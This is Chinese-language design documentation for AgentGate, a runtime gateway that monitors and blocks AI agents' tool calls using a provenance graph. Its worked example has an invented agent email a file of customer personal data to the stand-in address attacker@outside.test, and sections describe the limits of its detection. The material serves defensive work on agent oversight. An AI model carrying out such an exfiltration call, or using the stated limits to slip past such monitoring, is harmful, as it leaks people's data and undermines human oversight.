# AgentGate 当前工具实现详解

> 对应仓库版本：`AgentGate 0.6.0`
>
> 实现基线：`src/agentgate` 目录中的当前代码
> 文档目标：从同一个运行时场景出发，连续说明三个核心模块的输入、表示、处理逻辑和输出。

## 1. AgentGate 当前解决什么问题

AgentGate 是一个位于 Agent 与外部工具之间的运行时安全网关。它关注的不是模型“想了什么”，
而是最终准备进入工具执行器的结构化调用，以及工具实际返回的结果。

当前实现的核心路径是：

```text
Framework / MCP / Sidecar Tool Call
  -> CanonicalToolCall
  -> ToolSecurityEvent(REQUEST)
  -> CandidateGraphExtension over committed ATG
  -> Graph-based Detection + Authorization
  -> ALLOW / AUDIT / RESTRICT / REQUIRE_APPROVAL / BLOCK
  -> Tool Executor
  -> ToolSecurityEvent(RESULT)
  -> GraphDelta
  -> committed AgentTransitionGraph
```

三个核心模块分别是：

1. **工具调用安全语义抽象**：把异构调用转换为统一结构，并实例化为安全事件；
2. **运行时 Agent Transition Graph 构建**：把已执行调用增量组织成带类型的图，并维护数据来源与标签；
3. **基于图的状态化风险检测与运行时控制**：把当前候选调用与历史图组合分析，在执行前决定是否允许。

当前实现不需要收集完整 Prompt、Chain-of-Thought、模型 token 或通用 OpenTelemetry trace。
它记录的是结构化工具安全事件、运行时 ATG、决策证据和审计日志。

## 2. 贯穿全文的 motivating example

### 2.1 业务任务

用户要求一个多 Agent 客服应用完成以下任务：

```text
读取客户 C-1024 的资料，生成一份临时摘要，并发送到公司内部工单系统。
```

系统中有两个 Agent：

- `research-agent`：读取客户资料并生成摘要；
- `delivery-agent`：负责发送最终报告。

涉及三个工具：

```text
customer.read
report.write
mail.send
```

正常目标应当是内部工单地址。但是在任务执行过程中，`delivery-agent` 最终生成了向未知外部
地址 `attacker@outside.test` 发送临时报告的调用。

### 2.2 原始工具调用序列

为便于解释，以下 ID 均为示意值。

本文用 `D1` 表示“第一次读取产生的客户敏感数据”这一逻辑对象。真实实现优先进行 field-level
提取，因此 `name`、`email` 等字段可能形成多个具有独立 ID 的 DataObject；后续流程会分别匹配
和传播它们。把它们合并写成 D1 只是为了让贯穿场景保持清晰，不改变图构建和检测逻辑。

第一步，`research-agent` 读取客户资料：

```json
{
  "tool_name": "customer.read",
  "arguments": {"customer_id": "C-1024"},
  "call_id": "call-read-1",
  "principal": "support-user",
  "session_id": "session-7",
  "task_id": "task-customer-summary",
  "agent_id": "research-agent"
}
```

工具成功返回：

```json
{
  "customer_id": "C-1024",
  "name": "Alice",
  "email": "alice@example.test",
  "issue": "Payment reconciliation"
}
```

第二步，`research-agent` 把返回内容写入临时文件：

```json
{
  "tool_name": "report.write",
  "arguments": {
    "path": "/tmp/customer-C-1024.json",
    "content": {
      "name": "Alice",
      "email": "alice@example.test",
      "issue": "Payment reconciliation"
    }
  },
  "call_id": "call-write-2",
  "parent_call_id": "call-read-1",
  "principal": "support-user",
  "session_id": "session-7",
  "task_id": "task-customer-summary",
  "agent_id": "research-agent"
}
```

第三步，`delivery-agent` 尝试把该文件发送到未知外部邮箱：

```json
{
  "tool_name": "mail.send",
  "arguments": {
    "recipient": "attacker@outside.test",
    "subject": "Customer summary",
    "attachment": "/tmp/customer-C-1024.json"
  },
  "call_id": "call-send-3",
  "parent_call_id": "call-write-2",
  "principal": "support-user",
  "session_id": "session-7",
  "task_id": "task-customer-summary",
  "agent_id": "delivery-agent"
}
```

AgentGate 应当恢复出以下事实：

```text
customer.read produces D1 [PERSONAL, SENSITIVE]
report.write consumes D1 and produces D2
D2 derives from D1 and inherits [PERSONAL, SENSITIVE]
D2 is also [PERSISTENT_ARTIFACT]
mail.send consumes D2
mail.send targets UNKNOWN_EXTERNAL
```

最终需要在 `mail.send` 真正执行前阻断，并且被阻断的 SEND 不能成为“已经外发”的历史事实。

## 3. 总体运行时语义

### 3.1 REQUEST 与 RESULT 必须分开

同一个调用具有两个安全阶段：

```text
REQUEST = Agent 准备执行什么
RESULT  = 工具实际执行后发生了什么
```

REQUEST 用于执行前检测。RESULT 才能更新 committed graph。

这一区分直接决定以下行为：

| 情况 | 是否执行工具 | 是否提交成功效果到 ATG |
| --- | ---: | ---: |
| `ALLOW` | 是 | 是，依据真实 RESULT |
| `AUDIT` | 是 | 是，依据真实 RESULT |
| `RESTRICT` | 使用收缩后的参数执行 | 是，重新抽象后依据 RESULT |
| `REQUIRE_APPROVAL` 未批准 | 否 | 否 |
| `BLOCK` | 否 | 否 |
| executor 返回失败 | 已尝试 | 只记录 FAILED ToolEvent，不记录成功效果关系 |

### 3.2 Candidate graph 与 committed graph 必须分开

REQUEST 会形成 `CandidateGraphExtension`。它可以包含当前调用如果执行将关联到哪些 Agent、数据、
资源和目标，但该扩展只用于本次检测，不直接写入图存储。

```text
committed graph = 此前真正发生的调用事实
candidate delta = 当前准备执行的调用
```

检测输入是二者的组合：

```text
Risk = F(committed ATG, candidate extension, policy, optional authorization)
```

motivating example 中的 `call-send-3` 被阻断，因此它的 AgentNode、ToolEventNode、TARGETS、
CONSUMES、PARENT_OF 和 DELEGATES_TO 都不会进入 committed graph。

### 3.3 决策发生在 executor 之前

`AgentGateRuntime.execute` 在一个会话级协调锁中执行以下流程：

```text
1. 规范化可信上下文和时间
2. 查找已注册 ToolDefinition
3. 读取 committed graph
4. 构造 REQUEST event
5. 构造 candidate graph extension
6. 执行图规则、单事件规则、累计规则和可信任务授权
7. 处理 RESTRICT / APPROVAL / BLOCK
8. 只有 permits_execution=true 才调用 executor
9. 根据真实返回构造 RESULT event
10. 提交 result GraphDelta
11. 更新兼容状态和审计记录
```

`evaluate` 接口只执行第 1 至第 6 步并返回 `advisory_only=true`。它不使用完整执行锁，也不提供
complete mediation 保证，不能用 `evaluate` 后绕过 AgentGate 直接执行工具。

## 4. 模块一：工具调用安全语义抽象

模块一负责把协议结构转换为安全事实。它不读取图规则，也不直接返回 `BLOCK`。

### 4.1 模块一的输入与输出

输入：

```text
raw framework/MCP/Sidecar call
+ trusted RuntimeContext
+ ToolCapability
+ 与当前参数指纹相关的历史 DataObject
```

输出：

```text
CanonicalToolCall
ToolSecurityEvent(REQUEST)

执行后：
ToolSecurityEvent(RESULT)
```

### 4.2 第一级统一表示：CanonicalToolCall

所有 Adapter 最终生成同一个 `CanonicalToolCall`：

```python
class CanonicalToolCall:
    call_id: str
    tool_id: str | None
    tool_name: str

    principal_id: str
    agent_id: str | None
    session_id: str
    task_id: str | None
    parent_call_id: str | None

    arguments: dict[str, Any]
    timestamp: datetime

    source_framework: str
    source_transport: str | None
    metadata: dict[str, Any]

    approval_token: str | None
    context_hints: set[str]
```

字段语义：

| 字段 | 来源 | 含义 |
| --- | --- | --- |
| `call_id` | 框架调用 ID 或自动 UUID | 一次调用的稳定标识 |
| `tool_id` | 可选工具目录 | 工具实体标识；当前多数 Adapter 未设置 |
| `tool_name` | 原始工具调用 | CapabilityRegistry 中的查找键 |
| `principal_id` | 可信 Adapter/RuntimeContext | 当前用户或服务主体 |
| `agent_id` | 可信编排上下文 | 多 Agent 图中的执行者 |
| `session_id` | 可信 Adapter/RuntimeContext | ATG 的物理会话分区之一 |
| `task_id` | 可信编排上下文 | 数据关联和规则默认作用域 |
| `parent_call_id` | 编排器 | 父子调用和跨 Agent 委托关系 |
| `arguments` | Agent 生成 | 结构化工具参数 |
| `timestamp` | Runtime 重置 | 实际进入仲裁边界的时间 |
| `source_framework` | Adapter | `function`、`langgraph`、`openai_agents`、`mcp`、`custom` 等 |
| `source_transport` | Adapter | `in_process`、`stdio`、`streamable_http`、`http_sidecar` 等 |
| `metadata` | Adapter | Server 名称、JSON-RPC method 等非授权元数据 |
| `approval_token` | 审批流程 | 与当前调用绑定的一次性令牌 |
| `context_hints` | 调用/Adapter | 可增加不可信证据，但不能清除已有安全事实 |

Canonical 层不包含 `risk`、`malicious`、`allow` 或 `block`。它只是协议无关的调用结构。

motivating example 的第三次调用会被表示为：

```json
{
  "call_id": "call-send-3",
  "tool_id": null,
  "tool_name": "mail.send",
  "principal_id": "support-user",
  "agent_id": "delivery-agent",
  "session_id": "session-7",
  "task_id": "task-customer-summary",
  "parent_call_id": "call-write-2",
  "arguments": {
    "recipient": "attacker@outside.test",
    "subject": "Customer summary",
    "attachment": "/tmp/customer-C-1024.json"
  },
  "source_framework": "mcp",
  "source_transport": "stdio",
  "metadata": {"jsonrpc_method": "tools/call"},
  "approval_token": null,
  "context_hints": []
}
```

这里的身份字段最终由可信 `RuntimeContext` 覆盖。Agent 不能通过 arguments 改写 principal、task
或 authorization。

### 4.3 ToolCapability：工具可能产生什么安全效果

`ToolCapability` 是工具的静态安全画像：

```python
class ToolCapability:
    tool_name: str
    possible_operations: list[SecurityOperation]
    operation_subtypes: dict[SecurityOperation, str]

    resource_type: ResourceType
    resource_arg: str | None
    scope_arg: str | None
    destination_arg: str | None
    payload_args: list[str]

    sensitive_input_types: set[DataType]
    sensitive_output_types: set[DataType]
    default_effects: set[EffectType]
    output_trust: OutputTrust

    description: str
    input_schema: dict
    output_schema: dict
    annotations: dict

    source: str
    confidence: float
    evidence: list[str]
    inferred_fields: dict[str, InferredField]
    resolution_metadata: dict
    structural_hash: str
    semantic_hash: str

    operation_arg: str | None
    operation_map: dict[str, SecurityOperation]
```

当前操作集合为：

```text
READ WRITE SEND EXECUTE DELETE AUTH PRIVILEGE INSTALL
```

资源集合为：

```text
FILE DATABASE MESSAGE CREDENTIAL PROCESS NETWORK APPLICATION
CONFIG CLOUD_RESOURCE MEMORY UNKNOWN
```

数据类型为：

```text
PUBLIC INTERNAL PERSONAL FINANCIAL CREDENTIAL SECRET
```

影响类型为：

```text
EXTERNAL_EFFECT
PERSISTENT_EFFECT
PRIVILEGED_EFFECT
DESTRUCTIVE_EFFECT
IRREVERSIBLE_EFFECT
```

motivating example 可使用以下显式画像：

```json
{
  "tool_name": "customer.read",
  "possible_operations": ["READ"],
  "resource_type": "DATABASE",
  "resource_arg": "customer_id",
  "sensitive_output_types": ["PERSONAL"],
  "output_trust": "INTERNAL",
  "source": "explicit",
  "confidence": 1.0
}
```

```json
{
  "tool_name": "report.write",
  "possible_operations": ["WRITE"],
  "resource_type": "FILE",
  "resource_arg": "path",
  "payload_args": ["content"],
  "default_effects": ["PERSISTENT_EFFECT"],
  "source": "explicit",
  "confidence": 1.0
}
```

```json
{
  "tool_name": "mail.send",
  "possible_operations": ["SEND"],
  "resource_type": "MESSAGE",
  "destination_arg": "recipient",
  "payload_args": ["subject", "attachment"],
  "default_effects": ["EXTERNAL_EFFECT"],
  "source": "explicit",
  "confidence": 1.0
}
```

### 4.4 Capability 自动生成：规则优先，LLM 处理模糊事实

工具注册时可以直接提供显式 capability，也可以由 `CapabilityInferer` 从以下信息推断：

```text
tool name
description
input JSON Schema
output JSON Schema
annotations
```

确定性推断当前主要使用英文关键词：

| 语义 | 部分关键词 |
| --- | --- |
| DELETE | `delete`, `remove`, `destroy`, `drop` |
| PRIVILEGE | `grant_role`, `chmod`, `chown`, `iam_policy` |
| AUTH | `auth`, `login`, `token`, `credential` |
| INSTALL | `install`, `deploy`, `enable_plugin`, `register_skill` |
| EXECUTE | `execute`, `shell`, `command`, `run`, `spawn` |
| SEND | `send`, `upload`, `post`, `publish`, `email` |
| WRITE | `write`, `update`, `create`, `save`, `configure` |
| READ | `read`, `get`, `query`, `search`, `fetch`, `download` |

Schema 字段还用于确定：

```text
resource_arg: path / table / resource / id / name / service
scope_arg: limit / count / max_records
destination_arg: destination / recipient / url / endpoint / channel
payload_args: body / content / payload / data
sensitive types: token / email / card / private / secret 等字段词
```

以下情况会被标记为模糊语义：

```text
没有确定性 operation 候选
出现多个 operation 候选
工具名是 sync_workspace / process_record / run_action / prepare / handle
只因弱关键词 run 推断为 EXECUTE
```

若命中上述模糊条件且默认 LLM 配置可用，此时才调用 `SemanticResolver`。严格输出
`SemanticResolution`：

```json
{
  "operation": "SEND",
  "resource_type": "MESSAGE",
  "resource_arg": null,
  "scope_arg": null,
  "destination_arg": "recipient",
  "payload_args": ["body"],
  "input_data_types": [],
  "output_data_types": [],
  "effects": ["EXTERNAL_EFFECT"],
  "confidence": 0.93,
  "evidence": ["description and schema agree"]
}
```

该 Pydantic 模型设置了 `extra="forbid"`。若模型额外输出 `action=ALLOW` 或 `decision=BLOCK`，
验证会失败。LLM 只提取行为事实，不参与最终仲裁。

当前还需要注意：

- `build_runtime()` 默认从 `.env` 配置 OpenAI-compatible provider，并启用 resolver；
- `StructuredSemanticResolver` 仍是 provider-neutral 包装器，默认 completion 实现在
  `semantics/openai_compatible.py`；
- 调用 telemetry 会保存在 `resolution_metadata`，包括原因和耗时；
- resolver 置信度默认至少为 `0.75`；
- HTTP、超时或 Schema 错误会记录失败类型并回退到确定性结果或 `UNKNOWN`；
- 高影响工具语义仍不可靠时，注册失败并要求显式 capability，而不是猜测放行。

### 4.5 ToolSecurityEvent：统一安全事件

`ToolEventBuilder` 将 Canonical call、Capability、参数绑定结果和 RuntimeContext 实例化为
`ToolSecurityEvent`。

完整字段按含义分组如下：

| 类别 | 字段 |
| --- | --- |
| 事件阶段 | `event_id`, `phase`, `timestamp` |
| 调用身份 | `principal`, `session_id`, `call_id`, `agent_id`, `task_id`, `parent_call_id` |
| 工具来源 | `tool_name`, `source_framework`, `source_transport`, `source_metadata` |
| 安全操作 | `operation`, `operation_subtype`, `confidence`, `evidence` |
| 资源和范围 | `resource_type`, `resource_id`, `scope`, `operand` |
| 数据 | `data_objects`, `input_data_objects`, `output_data_objects`, `data_types`, `sensitivity` |
| 目标 | `destination`, `destination_type`, `trust_domain` |
| 影响 | `effects` |
| 请求/结果 | `arguments`, `result`, `success`, `affected_count` |
| 信任证据 | `trusted_source_labels`, `context_hints`, `trust_evidence`, `untrusted_context` |

其中 `operand` 当前被具体表示为：

```json
{
  "resource": "实际绑定的资源 ID 或 null",
  "scope": {"argument": "limit", "count": 10},
  "destination": "实际目标或 null",
  "payload_fields": ["body", "attachment"]
}
```

操作、资源、operand、数据对象和目标必须分开。例如 `mail.send`：

```text
operation    = SEND
resource     = MESSAGE
operand      = subject + attachment
data object  = attachment 实际引用的 D2
destination  = attacker@outside.test
trust domain = UNKNOWN_EXTERNAL
```

### 4.6 参数绑定和信任域分类

`ArgumentBinder` 使用 capability 中的参数路径绑定：

- `resource_arg` 产生 `resource_id`；
- `scope_arg` 转换为 `scope.count`；
- `destination_arg` 产生 destination；
- 当前 arguments 的指纹用于匹配同 task 历史 DataObject；
- capability 输入/输出类型与匹配对象类型合并为 `data_types`；
- 操作和目标域共同产生 effects。

目标域分类：

| 目标 | TrustDomain |
| --- | --- |
| 无 destination | `LOCAL` |
| localhost / 127.0.0.1 / ::1 | `LOCAL` |
| 配置的 internal domain 或 `.internal` / `.local` | `INTERNAL` |
| 配置的 trusted external domain | `TRUSTED_EXTERNAL` |
| 其他目标 | `UNKNOWN_EXTERNAL` |

目标类型当前包括：

```text
EMAIL_ADDRESS
HTTP_ENDPOINT
FILE_PATH
IDENTIFIER
```

### 4.7 motivating example 的 REQUEST event

`call-send-3` 经过参数绑定后，`/tmp/customer-C-1024.json` 的指纹与 D2 匹配：

```json
{
  "event_id": "event-send-3",
  "phase": "REQUEST",
  "principal": "support-user",
  "session_id": "session-7",
  "call_id": "call-send-3",
  "agent_id": "delivery-agent",
  "task_id": "task-customer-summary",
  "parent_call_id": "call-write-2",
  "tool_name": "mail.send",
  "source_framework": "mcp",
  "source_transport": "stdio",
  "operation": "SEND",
  "resource_type": "MESSAGE",
  "resource_id": null,
  "scope": null,
  "operand": {
    "resource": null,
    "scope": null,
    "destination": "attacker@outside.test",
    "payload_fields": ["subject", "attachment"]
  },
  "data_objects": ["D2"],
  "input_data_objects": ["D2"],
  "output_data_objects": [],
  "data_types": ["PERSONAL"],
  "sensitivity": ["PERSONAL"],
  "destination": "attacker@outside.test",
  "destination_type": "EMAIL_ADDRESS",
  "trust_domain": "UNKNOWN_EXTERNAL",
  "effects": ["EXTERNAL_EFFECT"],
  "success": null,
  "affected_count": null,
  "untrusted_context": false,
  "confidence": 1.0
}
```

这里仍然只是“准备发送”的 REQUEST，不代表数据已经外发。

### 4.8 RESULT event

允许执行后，`ResultClassifier` 基于真实 `ToolExecutionResult` 生成 RESULT：

```python
class ToolExecutionResult:
    output: Any
    success: bool
    affected_count: int | None
    error_type: str | None
    error_message: str | None
    timestamp: datetime
```

RESULT 会：

- 保留 REQUEST 的身份、操作、资源和输入对象；
- 合并 capability 声明的输出敏感类型；
- 根据实际输出字段再次推断数据类型；
- 使用真实 list 长度或 executor 提供值设置 `affected_count`；
- 根据 `output_trust` 和目标域设置 `untrusted_context`；
- 记录 `capability_output_trust:*` 证据；
- 在内容扫描命中时加入 `content_finding:*` 证据。

motivating example 的 SEND 被阻断，因此不存在该调用的 RESULT event。

## 5. 模块二：运行时 Agent Transition Graph

### 5.1 模块二是什么形态

模块二是一个带类型、方向、属性和时间的 property graph，不是树。

不能使用树的原因包括：

- 一个 DataObject 可以派生自多个父对象；
- 一个 DataObject 可以被多个后续调用消费；
- 同一 Resource 可以被多个 ToolEvent 操作；
- 同一个 Agent 可以参与多个 task；
- 多 Agent 之间既有委托关系，也可能共享同一数据对象；
- 时间顺序、编排关系和数据依赖是不同类型的边。

物理图以 `(principal_id, session_id)` 分区：

```python
class AgentTransitionGraph:
    graph_id: str
    principal_id: str
    session_id: str
    nodes: dict[str, GraphNodeUnion]
    edges: dict[str, GraphEdge]
    index: GraphIndex
    created_at: datetime
    updated_at: datetime
```

每个节点和边继续携带 `task_id`、`agent_id`。因此同一个 session 内可以容纳多个 task，但默认
高置信数据关联和图规则仍要求 same task。

### 5.2 五类节点

#### AgentNode

```python
class AgentNode:
    node_id: str
    node_type: "AGENT"
    principal_id: str
    session_id: str
    task_id: str | None
    agent_id: str | None
    labels: set[SecurityLabel]
    role: str | None
    created_at: datetime
    updated_at: datetime
```

稳定 ID 基于 `principal + agent_id` 生成。当前 `role` 字段存在，但各 Adapter 默认没有填充。

#### ToolEventNode

```python
class ToolEventNode:
    node_id: str
    node_type: "TOOL_EVENT"
    event_id: str
    call_id: str
    parent_call_id: str | None
    tool_name: str
    operation: SecurityOperation
    phase: EventPhase
    status: CANDIDATE | SUCCESS | FAILED | BLOCKED
    resource_type: ResourceType
    trust_domain: TrustDomain
    data_types: set[DataType]
    effects: set[EffectType]
    affected_count: int
    confidence: float
    untrusted_context: bool
    timestamp: datetime
```

候选 ToolEventNode 会出现在 `CandidateGraphExtension` 中。当前 BLOCK/pending approval 不提交，
所以 committed graph 正常主要出现 `SUCCESS` 和 `FAILED`。

#### ResourceNode

```python
class ResourceNode:
    node_id: str
    node_type: "RESOURCE"
    resource_type: ResourceType
    resource_id: str
    trust_domain: TrustDomain | None
```

稳定 ID 基于 `resource_type + resource_id` 生成。它表示实际操作对象，例如客户记录、文件路径或
进程对象。

#### DataObjectNode

```python
class DataObjectNode:
    node_id: str
    node_type: "DATA"
    object_id: str
    data_types: set[DataType]
    labels: set[SecurityLabel]
    source_resource: str | None
    source_field: str | None
    producer_call_id: str
    fingerprints: list[str]
    last_seen_at: datetime
```

DataObject 是轻量 provenance 和标签传播的核心实体。它不是原始数据的完整副本；默认图 debug
API 不返回 fingerprints。

#### TrustDomainNode

```python
class TrustDomainNode:
    node_id: str
    node_type: "TRUST_DOMAIN"
    domain_id: str
    category: TrustDomain
```

它表示一次调用的目标，例如 `attacker@outside.test` 及其类别 `UNKNOWN_EXTERNAL`。

### 5.3 九类边

| EdgeType | 方向 | 表示的事实 | 证据强度 |
| --- | --- | --- | --- |
| `NEXT` | previous ToolEvent -> current ToolEvent | 同 task、同 agent 的提交时间顺序 | 时间相关性 |
| `PERFORMS` | Agent -> ToolEvent | 哪个 Agent 执行调用 | 执行主体 |
| `OPERATES_ON` | ToolEvent -> Resource | 调用实际操作资源 | 资源关系 |
| `PRODUCES` | ToolEvent -> DataObject | 成功调用产生数据 | 高置信输出关系 |
| `CONSUMES` | ToolEvent -> DataObject | 当前参数使用已有对象 | 高置信输入关系 |
| `DERIVES_FROM` | child Data -> parent Data | 新对象由旧对象派生 | 高置信来源关系 |
| `TARGETS` | ToolEvent -> TrustDomain | 调用目标及信任域 | 目标关系 |
| `DELEGATES_TO` | parent Agent -> child Agent | 父子调用跨 Agent | 编排关系 |
| `PARENT_OF` | parent ToolEvent -> child ToolEvent | `parent_call_id` 关联 | 编排关系 |

必须明确：

```text
NEXT != 数据传播
PARENT_OF != 数据传播
DELEGATES_TO != 数据传播
```

只有 `CONSUMES`、`PRODUCES` 和 `DERIVES_FROM` 构成直接的数据来源证据。时间先后或父子调用只能
作为较弱的上下文证据。

### 5.4 REQUEST 阶段如何构造 candidate graph

`AgentTransitionGraphBuilder.preview_request(graph, event)` 执行：

1. 读取 REQUEST 中确定性匹配到的 `input_data_objects`；
2. 对 WRITE、SEND、EXECUTE、AUTH、INSTALL 等 sink，在没有确定性依赖时检查同 task 数据候选；
3. 可选调用 `DependencyResolver`；
4. 创建候选 AgentNode 和 `CANDIDATE ToolEventNode`；
5. 创建 `PERFORMS`；
6. 如有资源，创建 ResourceNode 和 `OPERATES_ON`；
7. 如消费历史数据，创建 `CONSUMES`；
8. 如有 destination，创建 TrustDomainNode 和 `TARGETS`；
9. 连接同 task、同 agent 最近事件的 `NEXT`；
10. 根据 `parent_call_id` 创建 `PARENT_OF`；
11. 父子事件的 agent 不同时创建 `DELEGATES_TO`。

返回结构：

```python
class CandidateGraphExtension:
    graph_id: str
    event_node_id: str
    request_event: ToolSecurityEvent
    delta: GraphDelta
    consumed_object_ids: list[str]
    unresolved_dependency: bool
```

motivating example 的候选扩展可抽象为：

```text
Agent(delivery-agent) --PERFORMS--> E3[SEND, CANDIDATE]
E2[WRITE, SUCCESS] --PARENT_OF--> E3
Agent(research-agent) --DELEGATES_TO--> Agent(delivery-agent)
E3 --CONSUMES--> D2[PERSONAL, SENSITIVE, PERSISTENT_ARTIFACT]
E3 --TARGETS--> attacker@outside.test[UNKNOWN_EXTERNAL]
```

上述内容只存在于本次风险评估的 candidate delta 中。

### 5.5 SUCCESS RESULT 如何提交图

若调用成功，`build_result_delta` 会重新基于 RESULT 生成非候选 delta：

```text
status = SUCCESS
candidate = false
reason = successful_result
```

对于成功 READ/WRITE：

1. 根据真实输出创建 DataObjectNode；
2. 创建 `ToolEvent --PRODUCES--> DataObject`；
3. 若 RESULT 保留输入对象，创建 `child Data --DERIVES_FROM--> parent Data`；
4. 把新 object ID 写入 RESULT 的 `output_data_objects`；
5. 把输入和输出对象合并到兼容字段 `data_objects`；
6. 使用 `GraphStore.apply_delta` 原子更新图和索引。

motivating example 在前两步成功后，committed graph 的核心结构是：

```text
Agent(research-agent)
  --PERFORMS--> E1[customer.read, SUCCESS]
  --PERFORMS--> E2[report.write, SUCCESS]

E1 --OPERATES_ON--> Resource(DATABASE:C-1024)
E1 --PRODUCES--> D1[PERSONAL, SENSITIVE, TRUSTED, INTERNAL_ORIGIN]

E1 --NEXT--> E2
E1 --PARENT_OF--> E2
E2 --OPERATES_ON--> Resource(FILE:/tmp/customer-C-1024.json)
E2 --CONSUMES--> D1
E2 --PRODUCES--> D2[PERSONAL, SENSITIVE, PERSISTENT_ARTIFACT, ...]
D2 --DERIVES_FROM--> D1
```

### 5.6 FAILED RESULT 如何提交图

executor 返回失败时：

```text
status = FAILED
reason = failed_result
```

当前实现仍可提交：

```text
AgentNode
FAILED ToolEventNode
PERFORMS
NEXT
PARENT_OF
DELEGATES_TO
```

但不会提交：

```text
ResourceNode / OPERATES_ON
DataObjectNode / PRODUCES / CONSUMES / DERIVES_FROM
TrustDomainNode / TARGETS
```

这样可以审计失败尝试，同时不把“请求中声明的效果”误记为已经发生。

### 5.7 DataObject 是如何建立的

当前仅对成功 READ 和 WRITE 创建 DataObject。对象 ID 使用以下信息的摘要：

```text
call_id + source_field path + data_type
```

READ 优先对结果做 field-level fragment 提取。例如：

```json
{
  "name": "Alice",
  "email": "alice@example.test",
  "issue": "Payment reconciliation"
}
```

根据字段词可提取 PERSONAL 类型片段，例如 `name` 和 `email`。对于没有字段级片段但存在声明
敏感类型、父对象或外部读取的情况，会创建聚合对象。

WRITE 若消费已有对象，即使其结果只是：

```json
{"path": "/tmp/customer-C-1024.json", "written": true}
```

也会基于父对象类型产生新的 DataObject，并把文件路径指纹加入该对象，使后续通过 attachment
或 execute path 引用文件时能够匹配。

### 5.8 指纹匹配和轻量 provenance

来源对象和候选参数使用相关但不同的指纹集合。`fingerprints_for` 用于已提交 DataObject，保留
完整值、规范化值和高特异性原子值；`argument_fingerprints_for` 用于当前工具参数，除上述签名
外还生成有界短语窗口，使敏感值嵌入较长 body 时仍能反查来源。二者都会递归展开 dict/list 中
的 scalar，并生成不可逆摘要：

```text
normalized_sha256
compact_sha256
sha256
atomic_sha256
phrase_sha256
```

还支持：

- Unicode NFKC 和空白规范化；
- URL decode；
- 可打印 UTF-8 Base64 decode；
- 参数侧的 2 至 4 词组合；来源侧不保留容易碰撞的通用短组合；
- 直接识别 64 位十六进制 SHA-256。

在线请求不会扫描整张图。它先为当前 arguments 计算指纹，再通过
`GraphIndex.data_by_fingerprint` 反查同 task DataObject 候选。

该非对称设计用于避免两个不同敏感值仅因共享通用片段而错误连边。例如
`alice@example.test` 与 `bob@example.test` 不再因共同出现 `example.test` 或描述性短词而关联，
但 `recipient=alice@example.test`、正文嵌入、URL decode 和可打印 Base64 decode 仍可命中来源。

该机制能处理：

```text
精确值复用
字符串/字段包含
文件路径引用
简单 URL/Base64 变换
预先提供的内容摘要
```

但它不是任意程序语句级动态污点分析，无法可靠覆盖加密、复杂聚合、语义改写、图片或未插桩
中间计算。

### 5.9 可选 LLM dependency resolver

当确定性匹配失败，而当前操作属于 WRITE、SEND、EXECUTE、AUTH 或 INSTALL，并且同 task 存在
最近数据对象时，可以注入 `StructuredDependencyResolver`。

输入仅包含最多 20 个最近候选：

```json
{
  "sources": [
    {
      "object_id": "D1",
      "source_resource": "C-1024",
      "source_field": "email",
      "labels": ["PERSONAL", "SENSITIVE"],
      "data_types": ["PERSONAL"]
    }
  ],
  "target": {
    "tool": "mail.send",
    "operation": "SEND",
    "arguments": {"body": "a semantic summary"}
  }
}
```

严格输出：

```json
{
  "dependencies": [
    {
      "object_id": "D1",
      "depends_on": true,
      "confidence": 0.95,
      "rationale": "The summary derives from the customer record"
    }
  ]
}
```

只有以下条件同时成立才接受：

```text
object_id 必须属于本次候选集合
depends_on = true
confidence >= 0.8
```

该 resolver 会看到目标 arguments，因此必须部署在允许的数据边界内。默认 runtime 已配置该
resolver，但只有确定性依赖匹配失败、当前事件是可消费数据的敏感操作且同 task 存在候选数据
对象时才会调用；失败时保留 `unresolved_dependency` 并继续执行确定性图规则。

### 5.10 SecurityLabel 的产生和传播

当前标签集合：

```text
敏感性：
SENSITIVE CREDENTIAL SECRET PERSONAL FINANCIAL INTERNAL_DATA

信任和来源：
TRUSTED UNTRUSTED INTERNAL_ORIGIN EXTERNAL_ORIGIN
USER_PROVIDED TOOL_PROVIDED SUSPICIOUS_CONTROL_CONTENT

制品和执行上下文：
EXECUTABLE_CONTENT PERSISTENT_ARTIFACT CONFIGURATION PRIVILEGED_CONTEXT
```

当前初始标签规则：

| 条件 | 新标签 |
| --- | --- |
| data type 不是 PUBLIC | `SENSITIVE` |
| PERSONAL/FINANCIAL/CREDENTIAL/SECRET/INTERNAL | 对应分类标签 |
| READ | `TOOL_PROVIDED` |
| READ 来自未知外部或 untrusted context | `UNTRUSTED`, `EXTERNAL_ORIGIN` |
| READ 来自本地/内部 | `TRUSTED`, `INTERNAL_ORIGIN` |
| WRITE | `PERSISTENT_ARTIFACT` |
| WRITE CONFIG | `CONFIGURATION` |
| content scanner 命中 | `UNTRUSTED`, `SUSPICIOUS_CONTROL_CONTENT` |

传播规则当前很直接：

```text
child.labels = child.initial_labels UNION all_parent.labels
```

因此 motivating example：

```text
D1 = [PERSONAL, SENSITIVE, TRUSTED, INTERNAL_ORIGIN, TOOL_PROVIDED]

D2 initial = [PERSONAL, SENSITIVE, PERSISTENT_ARTIFACT]
D2 inherits D1

D2 final = [
  PERSONAL,
  SENSITIVE,
  PERSISTENT_ARTIFACT,
  TRUSTED,
  INTERNAL_ORIGIN,
  TOOL_PROVIDED
]
```

### 5.11 Multi-tool 与 multi-agent 是否使用不同的图

不使用不同图。三种形态共享同一个 Schema：

```text
single-agent:
  同一个 AgentNode 通过 PERFORMS 连接多个事件

multi-tool:
  不同 ToolEvent 通过 Resource/Data/TrustDomain 和 NEXT 关联

multi-agent:
  多个 AgentNode 通过 DELEGATES_TO 和共享 DataObject 关联
```

跨 Agent 数据检测并不依赖 `DELEGATES_TO` 本身。真正的高置信数据关系仍是：

```text
Agent A event --PRODUCES--> D1
Agent B event --CONSUMES--> D1
```

`DELEGATES_TO` 与 `PARENT_OF` 只是额外的编排证据。

### 5.12 task 作用域

图物理上按 session 存储，但 `ToolEventNode`、`DataObjectNode` 和 GraphEdge 都携带 `task_id`。

当前确定性对象匹配先执行同 task 过滤，GraphPatternRule 默认也设置：

```yaml
scope:
  same_session: true
  same_task: true
  same_agent: false
```

因此同一 session 内：

```text
task-1 READ secret
task-2 SEND unrelated public value
```

不会仅因 task-1 存在敏感对象而命中高置信 exfiltration 图规则。没有稳定 `task_id` 时会使用空
task 作用域，多个调用可能被视为同一默认 task，因此接入方应尽量提供稳定任务标识。

### 5.13 图索引

`GraphIndex` 当前维护：

```python
events_by_operation: dict[str, set[str]]
events_by_task: dict[str, set[str]]
data_by_label: dict[str, set[str]]
data_by_task: dict[str, set[str]]
data_by_fingerprint: dict[str, set[str]]
latest_event_by_agent: dict[str, str]
latest_event_by_task: dict[str, str]
latest_event_by_context: dict[str, str]
